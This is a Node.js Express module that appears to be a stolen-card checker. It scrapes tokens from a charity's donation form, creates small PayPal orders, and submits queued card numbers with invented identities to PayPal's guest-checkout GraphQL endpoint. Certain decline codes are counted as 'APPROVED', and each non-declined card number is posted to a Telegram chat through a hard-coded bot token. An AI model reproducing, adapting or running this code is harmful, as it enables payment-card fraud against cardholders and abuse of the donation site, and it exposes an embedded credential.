// paypal2.js
const express = require('express');
const router = express.Router();
const axios = require('axios');
const cron = require('node-cron');
const { URLSearchParams } = require('url');

// Telegram config (configure your bot token & chat ID)
const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN || '6953499411:AAF52WklFHkwO5qirmadWBeCKh4QfJddlXs';
const TG_CHAT_ID = process.env.TG_CHAT_ID || '-1003774370016';

// In-memory queue & results
let paymentQueue = [];
let processedResults = [];

// Utility: Detect card type (VISA, MC, Amex, etc.)
function detectCardType(num) {
  const n = num.replace(/\s|-/g, '');
  if (n.startsWith('4')) return 'VISA';
  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return 'MASTER_CARD';
  if (n.startsWith('34') || n.startsWith('37')) return 'AMEX';
  if (n.startsWith('6011') || n.startsWith('65') || /^64[4-9]/.test(n) || /^622(12[6-9]|1[3-9]\d|[2-8]\d{2}|9[01]\d|92[0-5])/.test(n)) return 'DISCOVER';
  if (n.startsWith('3528') || n.startsWith('3529') || /^35[3-8]/.test(n)) return 'JCB';
  if (n.startsWith('62')) return 'CHINA_UNION_PAY';
  return 'VISA';
}

// Step 1: Get form tokens from donation page (brightercommunities.org)
async function getFormTokens() {
  try {
    const res = await axios.get('https://www.brightercommunities.org/wp-admin/admin-ajax.php', {
      params: { action: 'give_get_donation_form' },
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36',
        'Referer': 'https://www.brightercommunities.org/donation/'
      }
    });

    const html = res.data;
    const prefixMatch = html.match(/name="give-form-id-prefix" value="([^"]+)"/);
    const formIdMatch = html.match(/name="give-form-id" value="([^"]+)"/);
    const hashMatch = html.match(/name="give-form-hash" value="([^"]+)"/);

    if (!prefixMatch || !formIdMatch || !hashMatch) {
      throw new Error('Form tokens not found');
    }

    return {
      prefix: prefixMatch[1],
      id: formIdMatch[1],
      hash: hashMatch[1]
    };
  } catch (e) {
    throw new Error('Failed to fetch form tokens: ' + e.message);
  }
}

// Step 2: Create PayPal order (via AJAX)
async function createPayPalOrder(tokens, amount = '5.00') {
  try {
    const params = new URLSearchParams();
    params.append('action', 'give_paypal_commerce_create_order');
    params.append('give-form-id-prefix', tokens.prefix);
    params.append('give-form-id', tokens.id);
    params.append('give-form-hash', tokens.hash);
    params.append('give-amount', amount);
    params.append('payment-mode', 'paypal-commerce');

    const res = await axios.post('https://www.brightercommunities.org/wp-admin/admin-ajax.php', params, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36',
        'Referer': 'https://www.brightercommunities.org/donation/',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
      }
    });

    const orderId = res.data?.data?.id;
    if (!orderId) throw new Error('Order ID not found');

    return orderId;
  } catch (e) {
    throw new Error('Order creation failed: ' + e.message);
  }
}

// Step 3: Charge via PayPal GraphQL
async function chargeWithPayPal(orderId, cardData, firstName = 'William', lastName = 'Dives', email = null) {
  const [cc, mm, yy, cvv] = cardData.split('|');
  if (yy.length === 4) yy = yy.slice(-2);

  const cardType = detectCardType(cc);
  if (!email) {
    email = `william.dives${Math.floor(Math.random() * 900) + 100}@gmail.com`;
  }

  const variables = {
    token: orderId,
    card: {
      cardNumber: cc,
      type: cardType,
      expirationDate: `${mm}/20${yy}`,
      postalCode: '99901',
      securityCode: cvv
    },
    phoneNumber: '4969615048',
    firstName,
    lastName,
    email,
    billingAddress: {
      givenName: firstName,
      familyName: lastName,
      line1: '5112 N Tongass Hwy',
      city: 'Ketchikan',
      state: 'AK',
      postalCode: '99901',
      country: 'US'
    },
    shippingAddress: {
      givenName: firstName,
      familyName: lastName,
      line1: '5112 N Tongass Hwy',
      city: 'Ketchikan',
      state: 'AK',
      postalCode: '99901',
      country: 'US'
    },
    currencyConversionType: 'PAYPAL'
  };

  const headers = {
    'Host': 'www.paypal.com',
    'Paypal-Client-Context': orderId,
    'X-App-Name': 'standardcardfields',
    'Paypal-Client-Metadata-Id': orderId,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'https://www.paypal.com',
    'Referer': `https://www.paypal.com/smart/card-fields?token=${orderId}`,
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty'
  };

  const query = `
    mutation payWithCard($token: String!, $card: CardInput, $phoneNumber: String, $firstName: String, $lastName: String, $billingAddress: AddressInput, $shippingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType) {
      approveGuestPaymentWithCreditCard(token: $token, card: $card, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, shippingAddress: $shippingAddress, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType) {
        flags { is3DSecureRequired }
        cart { cartId }
      }
    }
  `;

  try {
    const res = await axios.post('https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard', 
      { query, variables },
      { headers }
    );

    const data = res.data;
    if (data.errors && data.errors.length > 0) {
      const err = data.errors[0];
      const inner = err.data?.[0] || {};
      const code = inner.code || '';
      const msg = err.message || 'Unknown error';
      const fullErr = code ? `${msg} (${code})` : msg;

      const approvedKeywords = [
        'INVALID_BILLING_ADDRESS', 'EXISTING_ACCOUNT_RESTRICTED',
        'INVALID_SECURITY_CODE', 'CVV2_FAILURE', 'INVALID SECURITY CODE'
      ];
      if (approvedKeywords.some(k => fullErr.toUpperCase().includes(k))) {
        return { status: 'APPROVED', message: fullErr };
      }
      return { status: 'DECLINED', message: fullErr };
    }

    if (data.data?.approveGuestPaymentWithCreditCard) {
      return { status: 'CHARGED', message: 'Success!' };
    }

    return { status: 'UNKNOWN', message: JSON.stringify(data) };
  } catch (e) {
    return { status: 'ERROR', message: e.message };
  }
}

// Queue processor (background)
cron.schedule('* * * * *', async () => {
  if (paymentQueue.length === 0) return;

  const item = paymentQueue.shift();
  if (!item) return;

  try {
    const tokens = await getFormTokens();
    const orderId = await createPayPalOrder(tokens, item.amount);

    const result = await chargeWithPayPal(orderId, item.card, item.firstName, item.lastName, item.email);

    const response = {
      ...item,
      result,
      processedAt: new Date().toISOString()
    };
    processedResults.push(response);

    // Send non-declined to Telegram
    if (result.status !== 'DECLINED') {
      const msg = `🟢 *${result.status}*\nCard: ${item.card}\nResult: ${result.message}`;
      await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
        chat_id: TG_CHAT_ID,
        text: msg,
        parse_mode: 'Markdown'
      });
    }

  } catch (e) {
    paymentQueue.push(item); // retry later
    console.error('Queue error:', e.message);
  }
});

// API: Add to queue
router.post('/paypal2/queue', (req, res) => {
  const { card, amount = '5.00', firstName, lastName, email } = req.body;
  if (!card || !firstName || !lastName) {
    return res.status(400).json({ status: 'error', message: 'Missing required fields' });
  }

  paymentQueue.push({ card, amount, firstName, lastName, email });
  res.json({ status: 'ok', queued: true, position: paymentQueue.length });
});

// API: Get recent results (live)
router.get('/paypal2/results', (req, res) => {
  const { limit = 10 } = req.query;
  res.json({
    totalProcessed: processedResults.length,
    results: processedResults.slice(-limit).reverse()
  });
});

// API: Clear results (admin)
router.delete('/paypal2/results', (req, res) => {
  processedResults = [];
  res.json({ status: 'ok' });
});

module.exports = router;
